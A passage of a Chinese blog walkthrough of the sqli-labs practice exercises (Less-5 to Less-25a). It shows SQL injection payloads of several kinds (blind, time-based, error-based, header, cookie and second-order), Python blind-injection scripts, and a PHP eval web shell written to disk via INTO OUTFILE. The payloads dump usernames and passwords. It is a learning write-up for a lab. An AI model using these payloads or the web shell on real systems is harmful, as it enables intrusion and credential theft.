alt=""><br>而一旦出错会报错<br><img src="11.png" alt=""><br>显然是布尔注入而且猜测语句</p><pre><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></pre><p>当然就可以很多操作了，通过substr()、ascii()爆破也能得到一切<br>打个比方</p><pre><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23     //截取数据库下第一个表的第一个字符与80ascii值进行对比找第二个字符只需要改成substr(&#39;xxx&#39;,2,1)即可。找第二个表改成limit 1,1</code></pre><p>也可以直接拿这个盲注脚本爆破，参数自己改就行了<br><img src="14.png" alt=""><br><a href="https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py" target="_blank" rel="noopener">https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py</a></p><h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>Less-6和Less-5的关系就和1♂2，3♂4的关系一样 把’改成”在脚本上修改就很行了</p><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>第七题提示Dump into outfile，即使用文件导出，然后第九第十题通过基于时间盲注的脚本也拿到了数据库所有数据，慢慢锻炼自己写py的能力吧。</p><h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>本关的标题是dump into outfile,意思是本关我们利用文件导入的方式进行注入,其实难点在于 猜测SQL语句和寻找网站的绝对路径，太菜了的我连自己本地都打了很久orz,不过也学到这个骚操作</p><!--more--><p>首先通过测试猜源码</p><pre><code>id&#39;)) LIMIT 0,1&quot;</code></pre><pre><code>?id=1&#39;)) or 1=1--+</code></pre><p>没有报错<br>然后可以利用文件导入导出，我一开始试了很久没写进去，找到了大师傅的博客<br><a href="https://blog.csdn.net/HHTNAN/article/details/78520511" target="_blank" rel="noopener">https://blog.csdn.net/HHTNAN/article/details/78520511</a>,了解到MYSQL数据导出与导入，secure_file_priv参数需要设置<br>在mysql文件下的my.ini文件的<code>[mysqld]</code>写入</p><pre><code>secure_file_priv=&#39;&#39;</code></pre><p>至于为什么，请参考大师傅的博客<br>然后就很顺利</p><pre><code>?id=1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\mima.php&quot;--+</code></pre><p><img src="31.png" alt=""></p><p>然后就可以写入一句话木马</p><pre><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\mima.php&quot;--+</code></pre><p><img src="32.png" alt=""></p><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>和Less-5居然一样的？盲注脚本都一样,可以参考第五题<br><a href="https://kit4y.github.io/2019/04/27/Sqli-Labs-Less-2-6/#more">https://kit4y.github.io/2019/04/27/Sqli-Labs-Less-2-6/#more</a></p><h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p>题目叫做GET-Bind-Time based XXX时间盲注，所以专门查看了一下时间盲注和布尔注入的一些基础知识</p><h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h4><p>时间盲注利用前提条件：<br>页面上没有显示位，也没有输出SQL语句执行错误信息。 正 确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条 件之后，页面的返回速度明显慢了5秒。</p><p>时间盲注常用函数：<br>IF(判断语句,A,B)<br>如果判断语句为真，则返回A<br>为假则返回B<br>一般和布尔盲注语句配合使用：</p><pre><code>if(ascii(substr(“payload”, 1, 1))=104, sleep(5), 1)</code></pre><p>如果第一个，号前的语句成立，则页面返回速度慢5秒<br>不成立，页面立即返回</p><p>时间盲注过程：</p><pre><code>if((select count(schema_name) from information_schema. schemata)=9,sleep(5),1) //判断数据库个数if((select length(schema_name) from information_schem a.schemata limit 0,1)=18,sleep(5),1)if((select ascii(substr((select schema_name from info rmation_schema.schemata limit 0,1),1,1)))=105,sleep(5),1)//判断 第一个库第一个字符</code></pre><p>所以本题先疯狂试探,发现不管咋样都是返回一样的，和铁疙瘩一样，所以就能通过时间盲注</p><pre><code>?id=1&#39; and sleep(3)%23</code></pre><p>发现等了3秒钟才响应了<br>然后和盲注一样玩</p><pre><code>1&#39; and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</code></pre><p>然后通过这个脚本拿到当前数据库的名字</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://localhost/sqli-labs-master/Less-9/?id=1'</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url_new <span class="token operator">=</span> url <span class="token operator">+</span> payload    time_start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url_new<span class="token punctuation">)</span>    time_end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> time_end <span class="token operator">-</span> time_start <span class="token operator">></span><span class="token number">5</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>result  <span class="token operator">=</span> <span class="token string">''</span>s <span class="token operator">=</span> r<span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz_'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"'and if(substr(database(),%d,1)='%c',sleep(5),1)--+"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>c<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Database name: "</span><span class="token operator">+</span>result<span class="token operator">+</span><span class="token string">" | Payload: "</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>            result <span class="token operator">+=</span> c            <span class="token keyword">break</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Over"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p><img src="33.png" alt=""><br>然后通过这个脚本得到第一个security数据表</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://localhost/sqli-labs-master/Less-9/?id=1'</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url_new <span class="token operator">=</span> url <span class="token operator">+</span> payload    time_start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url_new<span class="token punctuation">)</span>    time_end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> time_end <span class="token operator">-</span> time_start <span class="token operator">></span><span class="token number">5</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>result  <span class="token operator">=</span> <span class="token string">''</span>panduan <span class="token operator">=</span> <span class="token string">''</span>ll<span class="token operator">=</span><span class="token number">0</span>s <span class="token operator">=</span> r<span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"'and if(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),%d,1)='%c',sleep(5),1)--+"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>c<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Table_name name: "</span><span class="token operator">+</span>result<span class="token operator">+</span><span class="token string">" | Payload: "</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> c            <span class="token keyword">break</span>    <span class="token keyword">if</span> ll<span class="token operator">==</span>len<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'table_name:  '</span><span class="token operator">+</span>result<span class="token punctuation">)</span>        <span class="token keyword">break</span>    ll <span class="token operator">=</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p><img src="34.png" alt=""></p><h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>和第九题一样 , 将单引号换成双引号就好了</p><pre><code>?id=1&quot; and sleep(1)%23</code></pre><p>脚本和图九差不多只要修改一下闭合的单引号换成双引号</p><h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>先试试万能密码//一下的payload都是对于username的输入，密码框暂时可以随意输入2</p><pre><code>admin &#39; or 1=1#</code></pre><p>发现登录成功了</p><!--more--><p><img src="41.png" alt=""><br>然后查看字段数目和显示位</p><pre><code>1&#39; order by 3 # //登录后报错1&#39; union select 1,2 # //两个登录位</code></pre><p>然后可以使用任意一个登录位来爆数据库</p><pre><code>1&#39; union select 1,group_concat(schema_name) from information_schema.schemata#</code></pre><p><img src="42.png" alt=""><br>然后爆数据表名，字段名，和第一题差不多了</p><pre><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#123&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #111&#39; union select group_concat(username),group_concat(password) from users #</code></pre><h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>通过尝试和报错信息发现输入1”) or 1 #后可以用万能密码登录，接下来同上</p><pre><code>1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #1&quot;) union select group_concat(username),group_concat(password) from users #</code></pre><h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><p>万能密码测试发现</p><pre><code>1&#39;) or 1#</code></pre><p>能登录成功，但是不回显，所以可以布尔注入或者时间盲注 ，我们发现登录成功出现的照片名字叫flag.jpg,而登录失败叫slap.jpg，所以可以通过这个线索来爆破</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding:utf8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token comment" spellcheck="true"># config-start</span>sleep_time <span class="token operator">=</span> <span class="token number">5</span>error_time <span class="token operator">=</span> <span class="token number">1</span><span class="token comment" spellcheck="true"># config-end</span><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># admin' or ()-- </span>    column_name<span class="token operator">=</span><span class="token string">"schema_name"</span>    table_name<span class="token operator">=</span><span class="token string">"schemata"</span>    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">"  limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span><span class="token string">"')or ("</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">")-- "</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">exce</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># content-start</span>    url <span class="token operator">=</span> <span class="token string">"http://192.168.1.140/sqli-labs-master/Less-13/"</span>    postData <span class="token operator">=</span> getPayload<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>postData<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token comment" spellcheck="true"># content-end</span>    <span class="token comment" spellcheck="true"># judge-start</span>    <span class="token keyword">if</span> <span class="token string">"&lt;img src=\"../images/flag.jpg\"   />"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment" spellcheck="true"># judge-end</span><span class="token keyword">def</span> <span class="token function">doubleSearch</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>left_number<span class="token punctuation">,</span> right_number<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> left_number <span class="token operator">&lt;</span> right_number<span class="token punctuation">:</span>        mid <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>left_number <span class="token operator">+</span> right_number<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> exce<span class="token punctuation">(</span>str<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left_number <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            right_number <span class="token operator">=</span> mid        <span class="token keyword">if</span> left_number <span class="token operator">==</span> right_number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> exce<span class="token punctuation">(</span>str<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                mid <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 需要遍历的查询结果的数量</span>        counter <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 结果的长度</span>            counter <span class="token operator">+=</span> <span class="token number">1</span>            temp <span class="token operator">=</span> doubleSearch<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 从255开始查询</span>            <span class="token keyword">if</span> ord<span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 当为1的时候说明已经查询结束</span>                <span class="token keyword">break</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> counter <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 当结果集的所有行都被遍历后退出</span>            <span class="token keyword">break</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>search<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="43.png" alt=""></p><h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><p>与13题差不多 把<code>&#39;)</code> 改为 <code>&quot;</code>即可</p><pre><code>1&quot; or 1=1#</code></pre><p>登录成功不回显，魔改上面脚本即可</p><h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>与13题差不多 把<code>&#39;)</code> 改为<code>&#39;</code>即可</p><pre><code>1&#39; or 1=1#</code></pre><p>登录成功不回显，魔改上面脚本即可</p><h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>与13题差不多 把<code>&#39;)</code> 改为<code>&quot;)</code>即可</p><pre><code>1&quot;) or 1=1#</code></pre><p>登录成功不回显，魔改上面脚本即可</p><h4 id="新知识点：报错注入"><a href="#新知识点：报错注入" class="headerlink" title="新知识点：报错注入"></a>新知识点：报错注入</h4><p>基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名，这已经成为一套已经成型的公式，然后用普通注入的方法进行注入就好了，所以总结一下这么几个公式</p><p>1.直接使用报错：</p><pre class=" language-mysql"><code class="language-mysql">mysql> select 1,2 from user where id ="1" union select count(*),concat('/',(select database()),'/',floor(rand(0)*2))a from information_schema.columns group by a;1062 - Duplicate entry '/nuaa_msc/1' for key '<group_key>'</code></pre><!--more--><p>2、利用xpath函数—extractvalue报错</p><pre class=" language-mysql"><code class="language-mysql">mysql> select 1,2 from user where id ="1" and extractvalue(1,concat(0x7e,(select database()),0x73));1105 - XPATH syntax error: '~nuaa_mscs'</code></pre><p>concat里面甚至可以再放函数，如图用了group_concat，将用户名密码全部获得（但是好像输出长度有限定，只能输出一定长度结果）</p><pre><code>mysql&gt; select 1,2 from user where id =&quot;1&quot; and extractvalue(1,concat(0x7e,(select database()),&#39;/&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x73));1105 - XPATH syntax error: &#39;~nuaa_msc/articles&#39;</code></pre><p>3、利用xpath函数—updatexml报错：</p><pre><code>mysql&gt; select 1,2 from user where id =&quot;1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1);1105 - XPATH syntax error: &#39;~nuaa_msc~&#39;</code></pre><h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><p>题目咋一看是一个重置密码的功能，其实可以通过延时注入来跑，这里用新学的知识点,任意选择上面的一种即可</p><pre><code>passwd: 1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#uname: admin</code></pre><p><img src="51.png" alt=""></p><h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>题目名字叫POST-Header Injection-Uagent field-Error based;<br>登录成功会出现user agent<br><img src="52.png" alt=""><br>可以使用postman 修改User-Agent,注意首先要登录成功</p><pre><code>User-Agent : 1&#39;or updatexml(1,concat(&#39;#&#39;,(database())),0),&#39;&#39;,&#39;&#39;)#</code></pre><p><img src="53.png" alt=""><br>爆表</p><pre><code>User-Agent : 1&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;,&#39;&#39;)#</code></pre><p>爆字段</p><pre><code>User-Agent : 1&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0),&#39;&#39;,&#39;&#39;)#</code></pre><h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>和18一样，只是把User-Agent改成Referer<br><img src="54.png" alt=""></p><h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>Cookie 注入 , 修改自身cookie , 后台获取到这个cookie后 , 会直接拿去数据库里面进行比较 , 比较的时候就有可能注入，登录成功后修改 cookie 即可<br>首先登录，然后修改cookie，可以通过谷歌Applocation直接修改为</p><pre><code>&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata#</code></pre><p><img src="55.png" alt=""><br>也可以通过脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/Less-20/"</span>postDate <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span><span class="token string">'admin'</span><span class="token punctuation">,</span>    <span class="token string">'passwd'</span><span class="token punctuation">:</span><span class="token string">'admin'</span><span class="token punctuation">}</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'Host'</span><span class="token punctuation">:</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span><span class="token punctuation">,</span>    <span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>    <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span><span class="token string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span><span class="token punctuation">,</span>    <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span><span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'http://127.0.0.1/Less-20/index.php'</span><span class="token punctuation">,</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'uname=\' union select 1,group_concat(schema_name),3 from information_schema.schemata#'</span><span class="token punctuation">,</span>    <span class="token string">'Connection'</span><span class="token punctuation">:</span><span class="token string">'keep-alive'</span><span class="token punctuation">,</span>    <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">,</span>    <span class="token string">'Cache-Control'</span><span class="token punctuation">:</span><span class="token string">'max-age=0'</span><span class="token punctuation">}</span>content <span class="token operator">=</span> <span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>postDate<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span></code></pre><h4 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h4><p>和上面差不多，但是这里的cookie用过了base64加密而且加上了括号<br>原始payload为</p><pre><code>&#39;) union select 1,group_concat(schema_name),3 from information_schema.schemata#</code></pre><p>base64</p><pre><code>JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</code></pre><p>同样的方式修改即可</p><h4 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h4><p>上同，改为双引号,转码前</p><pre><code>&quot; union select 1,group_concat(schema_name),3 from information_schema.schemata#</code></pre><p>转码后</p><pre><code>IiB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoc2NoZW1hX25hbWUpLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEj</code></pre><h4 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h4><p>过滤了<code>#</code> 和<code>--+</code>等闭合的符号，所以通过 <code>or &#39;1&#39;=&#39;1</code> 来闭合后面的引号,任然使用之前的报错原理</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;1&#39;=&#39;1</code></pre><!--more--><p>获取security数据库的所有表单</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) or &#39;1&#39;=&#39;1</code></pre><p><img src="61.png" alt=""><br>获取user表所有字段</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) or &#39;1&#39;=&#39;1</code></pre><p>获取username/password</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) or &#39;1&#39;=&#39;1-1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) or &#39;1&#39;=&#39;1</code></pre><p>如果长度不够，可以通过limit 0,1这样的手法拿到所有数据</p><h4 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h4><h4 id="二次注入，可以概括为以下两步"><a href="#二次注入，可以概括为以下两步" class="headerlink" title="二次注入，可以概括为以下两步:"></a>二次注入，可以概括为以下两步:</h4><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p><p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。<br>本地登录的地方我们发现万能密码失败，于是查看源码</p><pre><code>$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></pre><p>由于对于我们的账号密码使用<code>mysql_real_escape_string</code>转义过。<br>本题可以采用二次注入</p><ol><li>首先创建一个user叫做<code>admin&#39;#</code>,密码随意，我们可以看到，数据库中真的就出现了这么一条数据</li><li>然后使用<code>admin&#39;#</code>加上自己的密码登录</li><li>然后修改密码为123456，最后效果居然是将admin用户改为123456的密码，自己新建的账号密码还是自己设定的</li></ol><p>why?<br>首先我们看更新密码的查询语句为</p><pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre><p>这是因为上面的数据库更新语句，在用户名为 “admin’#” 时执行的实际是：</p><pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre><p>等同于</p><pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;;</code></pre><h4 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h4><p>把 or、and过滤了,其实好像也没怎么用上，而且发现只是一次过滤，通过双写绕过，那么和第一题就差不多了<br>比如order中有or所以可以写成oorrder,将其中的一个or过滤后剩下为order</p><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata%23</code></pre><h4 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h4><p>先寻找注入点</p><pre><code>1&quot; oorr 1 %231&#39; oorr 1 %231 oorr 1 